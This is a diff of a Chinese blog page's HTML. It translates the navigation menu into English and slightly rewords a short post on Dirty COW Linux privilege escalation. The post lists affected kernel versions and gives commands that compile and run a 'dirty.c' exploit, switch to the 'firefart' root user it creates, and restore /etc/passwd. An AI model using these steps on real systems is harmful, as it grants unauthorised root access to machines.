@@ -85,37 +85,25 @@
             
             <li class="menu-item">
                 <a href="/">
-                    主页
+                    home
                 </a>
             </li>
             
             <li class="menu-item">
                 <a href="/archives">
-                    所有文章
+                    archives
                 </a>
             </li>
             
             <li class="menu-item">
                 <a href="/about">
-                    关于自己
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/tags">
-                    标签
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/categories">
-                    分类
+                    about me
                 </a>
             </li>
             
             <li class="menu-item">
                 <a href="/contact">
-                    一起交流
+                    blogs
                 </a>
             </li>
             
@@ -171,7 +159,7 @@
         
 
         <!-- Post Content -->
-        <p><br><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="string">'脏牛'</span>[Dirty copy-on-write] 提权小记:</div><div class="line">实际渗透成功率相对来讲还是蛮高的,废话不多说,祝大家好运吧,至于漏洞细节,请自行参考公告,影响内核版本  Dirty COW.c  <span class="number">2.6</span>.<span class="number">22</span> &lt; <span class="number">3.9</span> </div><div class="line"></div><div class="line">$ gcc -pthread dirty.c -o dirty -lcrypt</div><div class="line">$ ./dirty admin</div><div class="line">$ su firefart</div><div class="line"><span class="comment"># mv /tmp/passwd.bak /etc/passwd</span></div><div class="line"><span class="comment"># exit</span></div></pre></td></tr></table></figure></p>
+        <p><br><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="string">'脏牛'</span>[Dirty copy-on-write] 提权小记:</div><div class="line">实际渗透中,提的成功率相对来讲还是蛮高的,废话不多说,祝大家好运吧,至于漏洞细节,请自行参考公告,影响内核版本  Dirty COW.c  <span class="number">2.6</span>.<span class="number">22</span> &lt; <span class="number">3.9</span> </div><div class="line"></div><div class="line">$ gcc -pthread dirty.c -o dirty -lcrypt</div><div class="line">$ ./dirty admin</div><div class="line">$ su firefart</div><div class="line"><span class="comment"># mv /tmp/passwd.bak /etc/passwd</span></div><div class="line"><span class="comment"># exit</span></div></pre></td></tr></table></figure></p>
 <a id="more"></a>
 <p><img src="/img/dirty priv.png" alt="&#39;&#39;"><br></p>
 <h5 id="小结"><a href="#小结" class="headerlink" title="小结:"></a>小结:</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;另外还有一些比较经典的linux提权exp,后期有空会慢慢推上来</p>
